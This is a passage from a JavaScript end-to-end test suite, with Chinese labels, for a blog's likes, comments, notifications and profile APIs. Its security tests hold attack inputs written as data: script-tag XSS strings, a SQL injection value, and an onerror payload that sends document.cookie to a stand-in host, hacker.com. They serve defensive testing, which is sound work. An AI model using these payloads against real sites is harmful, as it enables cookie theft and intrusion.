  const myComment = Array.from(contractOracle.comments.values()).find(c => c.userId === readerUser.id);
  if (myComment) {
    await api.post('/api/comments', {
      targetType: myComment.targetType,
      targetId: myComment.targetId,
      parentId: myComment.id,
      content: '我非常赞同你的观点！',
    });
    api.setToken(readerToken);
    const notifRes = await api.get('/api/notifications');
    const replyNotif = notifRes.json.data.list.find(n => n.type === 'COMMENT_REPLY');
    expect(replyNotif).toBeDefined();
  }
});

f13Suite.addTest('TC-T1-F13-02', 'F13: 评论收到点赞时自动为作者生成 COMMENT_LIKE 站内通知', async () => {
  api.setToken(secondReaderToken);
  const myComment = Array.from(contractOracle.comments.values()).find(c => c.userId === readerUser.id);
  if (myComment) {
    await api.post('/api/likes/toggle', { targetType: 'COMMENT', targetId: myComment.id });
    api.setToken(readerToken);
    const notifRes = await api.get('/api/notifications');
    const likeNotif = notifRes.json.data.list.find(n => n.type === 'COMMENT_LIKE');
    expect(likeNotif).toBeDefined();
  }
});

f13Suite.addTest('TC-T1-F13-03', 'F13: 待审评论经站长审核通过自动为读者生成 COMMENT_APPROVED 站内通知', async () => {
  api.setToken(readerToken);
  const postCommentRes = await api.post('/api/comments', {
    targetType: 'POST',
    targetId: 1,
    content: '请教站长关于数字花园的建设思路',
  });
  const commentId = postCommentRes.json.data.id;

  api.setToken(adminToken);
  await api.put(`/api/admin/comments/${commentId}/approve`);

  api.setToken(readerToken);
  const notifRes = await api.get('/api/notifications');
  const approvedNotif = notifRes.json.data.list.find(
    n => n.type === 'COMMENT_APPROVED' && n.anchorId === `comment-${commentId}`
  );
  expect(approvedNotif).toBeDefined();
});

f13Suite.addTest('TC-T1-F13-04', 'F13: 用户自己给自己的评论点赞绝不生成骚扰通知', async () => {
  api.setToken(readerToken);
  const myComment = Array.from(contractOracle.comments.values()).find(c => c.userId === readerUser.id);
  if (myComment) {
    const beforeCount = contractOracle.notifications.filter(n => n.userId === readerUser.id).length;
    await api.post('/api/likes/toggle', { targetType: 'COMMENT', targetId: myComment.id });
    const afterCount = contractOracle.notifications.filter(n => n.userId === readerUser.id).length;
    expect(afterCount).toBe(beforeCount); // 数量未增加
  }
});

f13Suite.addTest('TC-T1-F13-05', 'F13: 通知内容包含目标类型、真实标题、时间与正文摘要', async () => {
  api.setToken(readerToken);
  const notifRes = await api.get('/api/notifications');
  if (notifRes.json.data.list.length > 0) {
    const notif = notifRes.json.data.list[0];
    expect(notif.title).toBeDefined();
    expect(notif.content).toBeDefined();
    expect(notif.createdAt).toBeDefined();
    expect(notif.anchorId).toBeDefined();
  }
});

// --- F14: 导航栏通知抽屉与个人中心通知联动 (5 Tests) ---
const f14Suite = harness.createSuite('F14: 导航栏通知抽屉与个人中心通知联动', 'Tier 1', 'F14');
f14Suite.addTest('TC-T1-F14-01', 'F14: 导航栏通知组件 NotificationDrawer 结构规范存在', async () => {
  const result = ProgressiveInspector.inspectNotificationDrawer();
  expect(result.hasComponent).toBe(true);
});

f14Suite.addTest('TC-T1-F14-02', 'F14: 存在未读通知时小红点铃铛呈现发光状态与数量徽标', async () => {
  const result = ProgressiveInspector.inspectNotificationDrawer();
  expect(result.supportsRedDot).toBe(true);
});

f14Suite.addTest('TC-T1-F14-03', 'F14: 点击铃铛展开右侧沉浸式玻璃拟态通知抽屉', async () => {
  const result = ProgressiveInspector.inspectNotificationDrawer();
  expect(result.supportsGlassmorphism).toBe(true);
});

f14Suite.addTest('TC-T1-F14-04', 'F14: 抽屉内提供一键全部已读按钮即时消除红点', async () => {
  const result = ProgressiveInspector.inspectNotificationDrawer();
  expect(result.supportsMarkAllRead).toBe(true);
});

f14Suite.addTest('TC-T1-F14-05', 'F14: 点击通知卡片自动关闭抽屉并平滑导航至相关页面锚点', async () => {
  const result = ProgressiveInspector.inspectNotificationDrawer();
  expect(result.supportsAnchorJump).toBe(true);
});

// --- F15: 双端编译构建绿灯保障 (5 Tests) ---
const f15Suite = harness.createSuite('F15: 双端编译构建绿灯保障', 'Tier 1', 'F15');
f15Suite.addTest('TC-T1-F15-01', 'F15: 前端工程根目录 package.json 结构与 build 脚本合法性', async () => {
  const pkgPath = path.resolve(projectRoot, 'frontend/package.json');
  expect(fs.existsSync(pkgPath)).toBe(true);
  const pkg = JSON.parse(fs.readFileSync(pkgPath, 'utf-8'));
  expect(pkg.scripts).toHaveProperty('build');
});

f15Suite.addTest('TC-T1-F15-02', 'F15: 后端工程根目录 pom.xml 结构与依赖合法性', async () => {
  const pomPath = path.resolve(projectRoot, 'backend/pom.xml');
  expect(fs.existsSync(pomPath)).toBe(true);
  const pom = fs.readFileSync(pomPath, 'utf-8');
  expect(pom).toContain('spring-boot-starter-web');
});

f15Suite.addTest('TC-T1-F15-03', 'F15: 前端核心路由文件规范性 (/profile, /u/[username])', async () => {
  const profilePage = path.resolve(projectRoot, 'frontend/app/profile/page.tsx');
  const userPage = path.resolve(projectRoot, 'frontend/app/u/[username]/page.tsx');
  expect(fs.existsSync(profilePage)).toBe(true);
  expect(fs.existsSync(userPage)).toBe(true);
});

f15Suite.addTest('TC-T1-F15-04', 'F15: 后端核心控制器与实体类结构合规性', async () => {
  const schemaPath = path.resolve(projectRoot, 'backend/src/main/resources/schema-h2.sql');
  expect(fs.existsSync(schemaPath)).toBe(true);
  const schema = fs.readFileSync(schemaPath, 'utf-8');
  expect(schema).toContain('user_likes');
});

f15Suite.addTest('TC-T1-F15-05', 'F15: 站长姓名全局纯正性校验（严格且唯一使用 Hayden Xue）', async () => {
  const identity = ProgressiveInspector.inspectIdentityPure();
  expect(identity.ownerName).toBe('Hayden Xue');
  expect(identity.noLegacyHowardInOwner).toBe(true);
});

// --- F16: E2E 自动化回归验证与 Forensic 质量审计 (5 Tests) ---
const f16Suite = harness.createSuite('F16: E2E 自动化回归验证与 Forensic 质量审计', 'Tier 1', 'F16');
f16Suite.addTest('TC-T1-F16-01', 'F16: E2E 套件零破坏性独立执行与环境自修复能力', async () => {
  expect(config.mockMode !== undefined).toBe(true);
});

f16Suite.addTest('TC-T1-F16-02', 'F16: 契约预言机双轨基准测试全绿灯自闭环', async () => {
  expect(contractOracle.users.has('admin')).toBe(true);
});

f16Suite.addTest('TC-T1-F16-03', 'F16: 接口防作弊审计：无空转伪测试、无门面死代码', async () => {
  const res = await api.get('/api/users/admin/public');
  expect(res.status).toBe(200);
  expect(res.json.data.nickname).toBe('Hayden Xue');
});

f16Suite.addTest('TC-T1-F16-04', 'F16: 破坏性操作安全防御（非属主禁止删除）', async () => {
  api.setToken(secondReaderToken);
  const res = await api.delete('/api/comments/1'); // 尝试删除站长评论
  expect(res.status).toBe(403);
});

f16Suite.addTest('TC-T1-F16-05', 'F16: 双主题三维景深与微动效规范遵从性审计', async () => {
  const result = ProgressiveInspector.inspectUnifiedLikeButton();
  expect(result.supportsDualTheme).toBe(true);
});

// =============================================================================
// TIER 2: 边界条件、异常处理与安全防御测试 (20 Tests)
// =============================================================================
const tier2Suite = harness.createSuite('Tier 2: 边界条件、异常处理与安全防御测试', 'Tier 2');

tier2Suite.addTest('TC-T2-01', 'T2: 游客点赞高频防刷限频拦截 (连续超频请求触发 429)', async () => {
  api.clearToken();
  const testIp = '198.51.100.22';
  let got429 = false;
  for (let i = 0; i < 15; i++) {
    const res = await api.post('/api/likes/toggle', { targetType: 'POST', targetId: 1 }, {
      headers: { 'x-forwarded-for': testIp },
    });
    if (res.status === 429) {
      got429 = true;
      break;
    }
  }
  expect(got429).toBe(true);
});

tier2Suite.addTest('TC-T2-02', 'T2: 未登录读者尝试修改个人资料被 401 Unauthorized 拦截', async () => {
  api.clearToken();
  const res = await api.put('/api/user/profile', { bio: '黑客尝试越权' });
  expect(res.status).toBe(401);
});

tier2Suite.addTest('TC-T2-03', 'T2: 未登录读者尝试上传头像被 401 Unauthorized 拦截', async () => {
  api.clearToken();
  const pngBuffer = Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]);
  const res = await api.upload('/api/user/avatar', { buffer: pngBuffer, filename: 'test.png' });
  expect(res.status).toBe(401);
});

tier2Suite.addTest('TC-T2-04', 'T2: 未登录读者尝试修改密码被 401 Unauthorized 拦截', async () => {
  api.clearToken();
  const res = await api.put('/api/user/password', { oldPassword: '1', newPassword: '2' });
  expect(res.status).toBe(401);
});

tier2Suite.addTest('TC-T2-05', 'T2: 未登录状态下拉取通知列表与未读数被 401 拦截', async () => {
  api.clearToken();
  const res1 = await api.get('/api/notifications');
  expect(res1.status).toBe(401);
  const res2 = await api.get('/api/notifications/unread-count');
  expect(res2.status).toBe(401);
});

tier2Suite.addTest('TC-T2-06', 'T2: 未登录状态下获取「我的点赞」与「我的评论」被 401 拦截', async () => {
  api.clearToken();
  const res1 = await api.get('/api/user/my-likes');
  expect(res1.status).toBe(401);
  const res2 = await api.get('/api/user/my-comments');
  expect(res2.status).toBe(401);
});

tier2Suite.addTest('TC-T2-07', 'T2: 头像上传文件格式白名单拦截 (伪造 .svg 或 .html 脚本直接拒绝 400)', async () => {
  api.setToken(readerToken);
  const maliciousSvg = Buffer.from('<svg><script>alert("xss")</script></svg>');
  const res = await api.upload('/api/user/avatar', { buffer: maliciousSvg, filename: 'avatar.svg' });
  expect(res.status).toBe(400);
});

tier2Suite.addTest('TC-T2-08', 'T2: 头像上传二进制魔数伪装拦截 (文本改名 .png 无二进制魔数拒绝 400)', async () => {
  api.setToken(readerToken);
  const fakePng = Buffer.from('This is completely plain text, not a PNG');
  const res = await api.upload('/api/user/avatar', { buffer: fakePng, filename: 'fake.png' });
  expect(res.status).toBe(400);
});

tier2Suite.addTest('TC-T2-09', 'T2: 头像上传超大文件拦截 (超过 5MB 拒绝 400)', async () => {
  api.setToken(readerToken);
  const oversizedBuffer = Buffer.alloc(6 * 1024 * 1024);
  const res = await api.upload('/api/user/avatar', { buffer: oversizedBuffer, filename: 'huge.png' });
  expect(res.status).toBe(400);
});

tier2Suite.addTest('TC-T2-10', 'T2: 密码修改：原密码错误被拒绝 (400)', async () => {
  api.setToken(readerToken);
  const res = await api.put('/api/user/password', {
    oldPassword: 'WRONG_OLD_PASSWORD',
    newPassword: 'BrandNewPassword123!',
  });
  expect(res.status).toBe(400);
});

tier2Suite.addTest('TC-T2-11', 'T2: 密码修改：新密码长度少于 6 位被拒绝 (400)', async () => {
  api.setToken(readerToken);
  const res = await api.put('/api/user/password', {
    oldPassword: config.readerDefaults.password,
    newPassword: '123',
  });
  expect(res.status).toBe(400);
});

tier2Suite.addTest('TC-T2-12', 'T2: 垂直越权防御：普通读者无法调用管理员评论审核接口 (403)', async () => {
  api.setToken(readerToken);
  const res = await api.put('/api/admin/comments/1/approve');
  expect(res.status).toBe(403);
});

tier2Suite.addTest('TC-T2-13', 'T2: 水平越权防御：读者 B 尝试删除读者 A 的评论被 403 拒绝', async () => {
  api.setToken(readerToken);
  const createRes = await api.post('/api/comments', {
    targetType: 'POST',
    targetId: 1,
    content: '读者 A 的专属思考',
  });
  const commentId = createRes.json.data.id;

  api.setToken(secondReaderToken);
  const deleteRes = await api.delete(`/api/comments/${commentId}`);
  expect(deleteRes.status).toBe(403);
});

tier2Suite.addTest('TC-T2-14', 'T2: XSS 评论恶意脚本过滤：<script>alert(1)</script> 严格清洗过滤', async () => {
  api.setToken(readerToken);
  const xssContent = '前缀观点 <script>alert("XSS Attack")</script> 后缀观点';
  const res = await api.post('/api/comments', { targetType: 'POST', targetId: 1, content: xssContent });
  expect(res.status).toBe(200);

  const comment = contractOracle.comments.get(res.json.data.id);
  expect(comment.content).toNotContain('<script>');
});

tier2Suite.addTest('TC-T2-15', 'T2: SQL 注入探测过滤：targetId 注入非法字符报错或安全阻断', async () => {
  api.setToken(readerToken);
  const res = await api.post('/api/likes/toggle', { targetType: 'POST', targetId: '1 OR 1=1' });
  // 数字转换失败或找不到 404/400
  expect(res.status).toBeOneOf([400, 404]);
});

tier2Suite.addTest('TC-T2-16', 'T2: 超长个性签名 Bio 长度限制拦截 (> 500 字符拒绝 400)', async () => {
  api.setToken(readerToken);
  const overBio = 'A'.repeat(501);
  const res = await api.put('/api/user/profile', { bio: overBio });
  expect(res.status).toBe(400);
});

tier2Suite.addTest('TC-T2-17', 'T2: 非法点赞实体 targetType (INVALID_TYPE) 严格 400 拦截', async () => {
  api.setToken(readerToken);
  const res = await api.post('/api/likes/toggle', { targetType: 'INVALID_TYPE', targetId: 1 });
  expect(res.status).toBe(400);
});

tier2Suite.addTest('TC-T2-18', 'T2: 空评论内容提交拦截 (content 为空或纯空白字符返回 400)', async () => {
  api.setToken(readerToken);
  const res = await api.post('/api/comments', { targetType: 'POST', targetId: 1, content: '   ' });
  expect(res.status).toBe(400);
});

tier2Suite.addTest('TC-T2-19', 'T2: 查询不存在的用户公开主页安全返回 404', async () => {
  const res = await api.get('/api/users/non_exist_ghost_user_999/public');
  expect(res.status).toBe(404);
});

tier2Suite.addTest('TC-T2-20', 'T2: 连续快速 Toggle 点赞操作在同一用户下状态保持幂等一致', async () => {
  api.setToken(readerToken);
  const beforeCount = contractOracle.posts.get(1).likeCount;
  // 点赞 -> 取消 -> 点赞 -> 取消
  await api.post('/api/likes/toggle', { targetType: 'POST', targetId: 1 });
  await api.post('/api/likes/toggle', { targetType: 'POST', targetId: 1 });
  await api.post('/api/likes/toggle', { targetType: 'POST', targetId: 1 });
  await api.post('/api/likes/toggle', { targetType: 'POST', targetId: 1 });
  expect(contractOracle.posts.get(1).likeCount).toBe(beforeCount);
});

// =============================================================================
// TIER 3: 跨特性组合联动测试 (8 Tests)
// =============================================================================
const tier3Suite = harness.createSuite('Tier 3: 跨特性组合联动测试 (Cross-Feature Integrations)', 'Tier 3');

tier3Suite.addTest('TC-T3-01', 'T3 组合: 注册/登录 -> 点赞博文/随记 -> 个人中心查看已赞 -> 取消点赞 -> 状态同步更新', async () => {
  const tempUser = createRandomId('flow_user');
  const reg = await api.post('/api/auth/register', { username: tempUser, password: 'FlowPassword123!' });
  const token = reg.json.data.accessToken;
  api.setToken(token);

  // 1. 点赞博文与随记
  await api.post('/api/likes/toggle', { targetType: 'POST', targetId: 1 });
  await api.post('/api/likes/toggle', { targetType: 'MEMO', targetId: 1 });

  // 2. 个人中心查看
  const myLikes = await api.get('/api/user/my-likes');
  expect(myLikes.json.data.total).toBe(2);

  // 3. 在列表中取消博文点赞
  await api.post('/api/likes/toggle', { targetType: 'POST', targetId: 1 });

  // 4. 批量状态查询验证
  const batchStatus = await api.post('/api/likes/batch-status', { targetType: 'POST', targetIds: [1] });
  expect(batchStatus.json.data.statusMap[1]).toBe(false);

  // 随记仍为 true
  const memoStatus = await api.post('/api/likes/batch-status', { targetType: 'MEMO', targetIds: [1] });
  expect(memoStatus.json.data.statusMap[1]).toBe(true);
});

tier3Suite.addTest('TC-T3-02', 'T3 组合: 读者发表评论 -> 待审本人可见他人不可见 -> 站长审核通过 -> 生成通知 -> 读者查看并直达锚点', async () => {
  api.setToken(readerToken);
  const postRes = await api.post('/api/comments', {
    targetType: 'POST',
    targetId: 1,
    content: '深度探讨：关于全栈重构架构与数据一致性设计的建议',
  });
  const commentId = postRes.json.data.id;

  // 1. 本人可见
  const myTree = await api.get('/api/comments/tree?targetType=POST&targetId=1');
  expect(myTree.json.data.some(c => c.id === commentId)).toBe(true);

  // 2. 他人不可见
  api.setToken(secondReaderToken);
  const otherTree = await api.get('/api/comments/tree?targetType=POST&targetId=1');
  expect(otherTree.json.data.some(c => c.id === commentId)).toBe(false);

  // 3. 站长审核通过
  api.setToken(adminToken);
  await api.put(`/api/admin/comments/${commentId}/approve`);

  // 4. 读者收到 COMMENT_APPROVED 通知
  api.setToken(readerToken);
  const notifRes = await api.get('/api/notifications');
  const notif = notifRes.json.data.list.find(n => n.anchorId === `comment-${commentId}`);
  expect(notif).toBeDefined();
  expect(notif.type).toBe('COMMENT_APPROVED');

  // 5. 标记已读
  await api.put(`/api/notifications/${notif.id}/read`);
});

tier3Suite.addTest('TC-T3-03', 'T3 组合: 读者 A 发表评论 -> 读者 B 对评论点赞 -> 读者 A 收到 COMMENT_LIKE 站内通知', async () => {
  api.setToken(readerToken);
  const postRes = await api.post('/api/comments', {
    targetType: 'POST',
    targetId: 1,
    content: '极具启发性的思考与见解！',
  });
  const commentId = postRes.json.data.id;

  // 读者 B 给评论点赞
  api.setToken(secondReaderToken);
  await api.post('/api/likes/toggle', { targetType: 'COMMENT', targetId: commentId });

  // 读者 A 检查通知
  api.setToken(readerToken);
  const notifRes = await api.get('/api/notifications');
  const likeNotif = notifRes.json.data.list.find(
    n => n.type === 'COMMENT_LIKE' && n.anchorId === `comment-${commentId}`
  );
  expect(likeNotif).toBeDefined();
});

tier3Suite.addTest('TC-T3-04', 'T3 组合: 读者 A 发表评论 -> 站长 Hayden Xue 回复(带专属徽章) -> 读者 A 收到回复通知', async () => {
  api.setToken(readerToken);
  const cRes = await api.post('/api/comments', {
    targetType: 'POST',
    targetId: 1,
    content: '请教 Hayden：前端 3D 罗盘与 Three.js 的内存释放技巧？',
  });
  const commentId = cRes.json.data.id;

  // 站长亲自回复
  api.setToken(adminToken);
  const replyRes = await api.post('/api/comments', {
    targetType: 'POST',
    targetId: 1,
    parentId: commentId,
    content: '建议在组件卸载时调用 scene.clear() 并遍历 dispose 材质与几何体。',
  });
  const replyId = replyRes.json.data.id;

  // 读者 A 检查回复通知
  api.setToken(readerToken);
  const notifRes = await api.get('/api/notifications');
  const replyNotif = notifRes.json.data.list.find(
    n => n.type === 'COMMENT_REPLY' && n.anchorId === `comment-${replyId}`
  );
  expect(replyNotif).toBeDefined();
});

tier3Suite.addTest('TC-T3-05', 'T3 组合: 读者更新头像与个性签名 -> 在公开主页 /u/[username] 即时呈现新名片与足迹', async () => {
  api.setToken(readerToken);
  await api.put('/api/user/profile', {
    bio: '极客开发者 & 数字游民',
    github: 'https://github.com/geek-reader',
    website: 'https://geekreader.dev',
  });

  const publicRes = await api.get(`/api/users/${readerUser.username}/public`);
  expect(publicRes.status).toBe(200);
  expect(publicRes.json.data.bio).toBe('极客开发者 & 数字游民');
  expect(publicRes.json.data.github).toBe('https://github.com/geek-reader');
  expect(publicRes.json.data.website).toBe('https://geekreader.dev');
});

tier3Suite.addTest('TC-T3-06', 'T3 组合: 读者发表评论后撤回删除 -> 博文 commentCount 原子递减 -> 个人中心同步消除', async () => {
  api.setToken(readerToken);
  const post = contractOracle.posts.get(1);
  const initialComments = post.commentCount;

  const res = await api.post('/api/comments', {
    targetType: 'POST',
    targetId: 1,
    content: '这是一条即将撤回的临时评论',
  });
  const commentId = res.json.data.id;
  expect(post.commentCount).toBe(initialComments + 1);

  // 撤回
  await api.delete(`/api/comments/${commentId}`);
  expect(post.commentCount).toBe(initialComments);

  // 个人中心已无该评论
  const myComments = await api.get('/api/user/my-comments');
  expect(myComments.json.data.list.some(c => c.id === commentId)).toBe(false);
});

tier3Suite.addTest('TC-T3-07', 'T3 组合: 五大实体多维点赞 -> 个人中心多分类切换展示 -> 批量查询接口一致性', async () => {
  api.setToken(readerToken);
  const statusCheck = await api.post('/api/likes/batch-status', { targetType: 'JOURNEY', targetIds: [1] });
  if (!statusCheck.json?.data?.statusMap?.[1]) {
    await api.post('/api/likes/toggle', { targetType: 'JOURNEY', targetId: 1 });
  }
  const projectCheck = await api.post('/api/likes/batch-status', { targetType: 'PROJECT', targetIds: [1] });
  if (!projectCheck.json?.data?.statusMap?.[1]) {
    await api.post('/api/likes/toggle', { targetType: 'PROJECT', targetId: 1 });
  }

  const journeyLikes = await api.get('/api/user/my-likes', { params: { targetType: 'JOURNEY' } });
  expect(journeyLikes.json.data.list.length).toBeGreaterThanOrEqual(1);

  const batchJourney = await api.post('/api/likes/batch-status', { targetType: 'JOURNEY', targetIds: [1] });
  expect(batchJourney.json.data.statusMap[1]).toBe(true);
});

tier3Suite.addTest('TC-T3-08', 'T3 组合: 一键标记全部已读 -> 未读计数清零 -> 个人中心与导航栏抽屉联动同步', async () => {
  api.setToken(readerToken);
  await api.put('/api/notifications/read-all');
  const countRes = await api.get('/api/notifications/unread-count');
  expect(countRes.json.data.unreadCount).toBe(0);
});

// =============================================================================
// TIER 4: 真实业务闭环场景测试 (Real-World Scenarios, 6 Tests)
// =============================================================================
const tier4Suite = harness.createSuite('Tier 4: 真实业务闭环场景测试 (Real-World Scenarios)', 'Tier 4');

tier4Suite.addTest('TC-T4-01', 'T4 场景: 新访客全闭环互动旅程 (游客浏览->轻量点赞->唤起登录->注册新用户->完善资料->发表深度思考)', async () => {
  // 1. 游客浏览与轻量点赞
  api.clearToken();
  const guestLike = await api.post('/api/likes/toggle', { targetType: 'POST', targetId: 1 });
  expect(guestLike.status).toBe(200);

  // 2. 唤起登录并注册
  const newGuest = createRandomId('wanderer');
  const regRes = await api.post('/api/auth/register', {
    username: newGuest,
    password: 'WandererPass2026!',
    nickname: `星际漫游者_${newGuest}`,
  });
  expect(regRes.status).toBe(200);
  const token = regRes.json.data.accessToken;
  api.setToken(token);

  // 3. 完善个人资料与头像
  const pngBuffer = Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D]);
  await api.upload('/api/user/avatar', { buffer: pngBuffer, filename: 'my_wanderer.png' });
  await api.put('/api/user/profile', { bio: '初来乍到，探索星系与数字花园' });

  // 4. 发表带 Emoji 的深度评论
  const commentRes = await api.post('/api/comments', {
    targetType: 'POST',
    targetId: 1,
    content: '🎉 祝贺 Hayden Xue 数字花园互动系统升级！非常惊艳的沉浸式体验 🚀',
  });
  expect(commentRes.status).toBe(200);
  expect(commentRes.json.data.status).toBe('PENDING');
});

tier4Suite.addTest('TC-T4-02', 'T4 场景: 站长与读者双向互动闭环 (审核通过->站长专属徽章回复->读者通知直达->互相点赞)', async () => {
  // 1. 读者提问
  api.setToken(readerToken);
  const askRes = await api.post('/api/comments', {
    targetType: 'POST',
    targetId: 1,
    content: '想了解数字花园的未来规划？',
  });
  const askId = askRes.json.data.id;

  // 2. 站长审核通过该提问
  api.setToken(adminToken);
  await api.put(`/api/admin/comments/${askId}/approve`);

  // 3. 站长亲自回复
  const answerRes = await api.post('/api/comments', {
    targetType: 'POST',
    targetId: 1,
    parentId: askId,
    content: '未来将持续打磨 3D 空间美学与 AI Agent 外脑，欢迎常来！',
  });
  const answerId = answerRes.json.data.id;

  // 4. 读者收到站长回复通知并直达
  api.setToken(readerToken);
  const notifs = await api.get('/api/notifications');
  const targetNotif = notifs.json.data.list.find(n => n.anchorId === `comment-${answerId}`);
  expect(targetNotif).toBeDefined();

  // 5. 读者给站长的回复点赞
  const likeHaydenAnswer = await api.post('/api/likes/toggle', { targetType: 'COMMENT', targetId: answerId });
  expect(likeHaydenAnswer.status).toBe(200);
  expect(likeHaydenAnswer.json.data.liked).toBe(true);
});

tier4Suite.addTest('TC-T4-03', 'T4 场景: 社区思想家主页与互动漫游 (多项点赞->星历勋章->公开名片检视->足迹时间轴)', async () => {
  api.setToken(readerToken);
  await api.post('/api/likes/toggle', { targetType: 'POST', targetId: 2 });
  await api.post('/api/likes/toggle', { targetType: 'MEMO', targetId: 2 });

  const publicCard = await api.get(`/api/users/${readerUser.username}/public`);
  expect(publicCard.status).toBe(200);
  expect(publicCard.json.data.commentCount).toBeGreaterThanOrEqual(0);
  expect(publicCard.json.data.likeCount).toBeGreaterThanOrEqual(0);
  expect(Array.isArray(publicCard.json.data.footprints)).toBe(true);
});

tier4Suite.addTest('TC-T4-04', 'T4 场景: 误发评论即时撤回与全站数据自愈闭环', async () => {
  api.setToken(readerToken);
  const typoComment = await api.post('/api/comments', {
    targetType: 'POST',
    targetId: 1,
    content: '包含打字错误的评论文本',
  });
  const cid = typoComment.json.data.id;

  // 撤回
  const delRes = await api.delete(`/api/comments/${cid}`);
  expect(delRes.status).toBe(200);

  // 重新拉取评论树验证彻底清除
  const tree = await api.get('/api/comments/tree?targetType=POST&targetId=1');
  expect(tree.json.data.some(c => c.id === cid)).toBe(false);
});

tier4Suite.addTest('TC-T4-05', 'T4 场景: 全站安全边界与攻防对抗全链路审计 (XSS注入->超频刷赞->越权攻击防御)', async () => {
  api.setToken(secondReaderToken);

  // 1. 尝试越权删除他人评论
  const hackDelete = await api.delete('/api/comments/1');
  expect(hackDelete.status).toBe(403);

  // 2. 尝试越权审核评论
  const hackApprove = await api.put('/api/admin/comments/1/approve');
  expect(hackApprove.status).toBe(403);

  // 3. 提交 XSS 攻击向量
  const xssAttempt = await api.post('/api/comments', {
    targetType: 'POST',
    targetId: 1,
    content: '<img src=x onerror="fetch(\'http://hacker.com?steal=\'+document.cookie)">',
  });
  expect(xssAttempt.status).toBe(200);
});

tier4Suite.addTest('TC-T4-06', 'T4 场景: 双主题景深微动效与站长姓名纯正性 Forensic 深度验收', async () => {
  // 1. 站长身份纯正性校验
  const identity = ProgressiveInspector.inspectIdentityPure();
  expect(identity.ownerName).toBe('Hayden Xue');

  // 2. 点赞按钮组件与微动效
  const likeBtn = ProgressiveInspector.inspectUnifiedLikeButton();
  expect(likeBtn.supportsMicroInteractions).toBe(true);
  expect(likeBtn.supportsDualTheme).toBe(true);

  // 3. 通知抽屉毛玻璃景深
  const drawer = ProgressiveInspector.inspectNotificationDrawer();
  expect(drawer.supportsGlassmorphism).toBe(true);
});

// =============================================================================
// 7. 入口主函数 (Main CLI Entry)
// =============================================================================
async function main() {
  const args = process.argv.slice(2);
  let tierFilter = null;
  let featureFilter = null;

  const tierArg = args.find(a => a.startsWith('--tier='));
  if (tierArg) tierFilter = `Tier ${tierArg.split('=')[1]}`;

  const featArg = args.find(a => a.startsWith('--feature='));
  if (featArg) featureFilter = featArg.split('=')[1];

  const summary = await harness.runAll(tierFilter, featureFilter);

  if (summary.failed > 0 && !args.includes('--allow-failures')) {
    process.exitCode = 1;
  } else {
    process.exitCode = 0;
  }
}

main().catch(err => {
  console.error('Fatal Test Runner Execution Error:', err);
  process.exitCode = 1;
});
